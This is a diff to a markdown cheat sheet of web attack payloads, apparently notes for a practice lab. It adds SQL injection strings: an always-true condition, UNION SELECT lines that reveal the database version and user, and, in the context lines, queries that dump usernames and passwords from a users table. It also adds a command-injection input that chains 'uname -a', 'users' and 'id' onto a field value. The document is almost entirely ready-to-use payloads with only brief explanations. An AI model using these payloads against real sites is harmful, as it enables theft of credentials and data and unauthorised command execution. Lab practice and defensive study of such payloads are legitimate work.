@@ -33,6 +33,13 @@ $result=mysql_query($getid) or die('
 MySQL delimiter: `#`
 SQL delimiter: `--
 
+* Always true scenario:
+
+`%' or '0'='0`
+
+% will probably not be equal to anything so will be false
+'0'='0' - always equal to true
+
 * Figure out how many columns are there:
 
 `‘ ORDER BY 1#`
@@ -43,10 +50,12 @@ etc.
 * Find out the database version:
 
 `‘ UNION ALL SELECT 1,@@VERSION#`
+`%' or 0=0 union select null, version() #`
 
 * Find out the database the user is running as and the name of the database:
 
 `‘ UNION ALL SELECT user(),database()#`
+`%' or 0=0 union select null, user() #`
 
 * Dump MySQL hash:
 
@@ -63,3 +72,9 @@ etc.
 * Dump username and password from `example.users` table:
 
 `‘ UNION ALL SELECT user, password FROM example.users #`
+
+
+COMMAND INJECTION
+-----------------
+
+* Try to use pipe, ampersands, etc. Example: `1 | uname -a & users & id`
